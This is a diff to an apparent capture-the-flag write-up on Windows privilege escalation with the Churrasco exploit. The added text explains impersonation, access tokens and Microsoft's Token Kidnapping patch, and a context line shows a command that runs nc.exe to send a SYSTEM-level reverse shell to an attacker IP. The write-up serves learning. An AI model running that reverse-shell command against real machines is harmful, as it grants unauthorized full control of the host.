@@ -76,5 +76,20 @@ churrasco.exe -d "C:\tmp\nc.exe -e cmd.exe 10.10.16.5 443"
 
 The reverse shell was captured with elevated privileges.
 
-For this box, we used Churrasco.exe exploit. The Churrasco.exe exploits the  [Get the notes from PDF - Third last tab of Firefox.]
-	
+For this box, we used Churrasco.exe exploit. The Churrasco.exe exploit take advantage of 'Token Kidnapping Revenge' attack. Here are few of the background theory I have learned.
+
+1. **Impersonation**: It is an ability of a thread to execute using a different security information than the process that owns the thread. Threads Impersonates in order to run the code under different user account, all ACL checks are done against the impersonated users. Impersonation can only be performed by processes with the 'SeImpersonatePrivilege'  aka "Impersonate a client after authentication" privilege. When a thread impersonates, it has an associated impersonation token.
+   
+2. **Token:** An access token is an object that describes the security context of a process or thread. It includes the identity and privileges of the user account associated with the process or thread. They can be primary or Impersonation tokens. Primary tokens are those that are assigned to processes. Impersonation tokens are those that can be get when impersonation occurs. There are four Impersonation levels. 'SecurityAnonymous', 'SecurityIdentity', 'SecurityImpersonation' and 'SecurityDelegation'. Impersonation takes place mostly during Inter Process Communication (IPC) using Local Procedure Call (LPC).
+
+In the past, Windows Services ran as a Local SYSTEM account. Compromise of service == Full System Compromise. Than Microsoft Introduce NETWORK SERVICES and LOCAL SERVICES account. Hence, Compromise of service != Full System Compromise.
+
+
+> [!NOTE] Token Kidnapping Patch from Microsoft
+>Some Windows services that are impersonate privileged account are protected, they are create with a "special" permission. For Example: Service runs under the NETWORK SERVICE account CAN NOT access the protected service running under the same NETWORK SERVICE account. This protection was introduce as a patch from Microsoft. Before this patch, it was possible to elevate privileges by getting privilege impersonation token from another process running under the same NETWORK SERVICE account.
+
+The following two resources covers the in-depth details.
+
+[Research Paper on Token Kidnapping](https://home.ubalt.edu/abento/453/winsecurity/TokenKidnappingRevenge.pdf)
+
+[Defcon - Token Kidnapping](https://github.com/Re4son/Churrasco/blob/master/DEFCON-18-Cerrudo-Token-Kidnapping-Revenge.pdf)
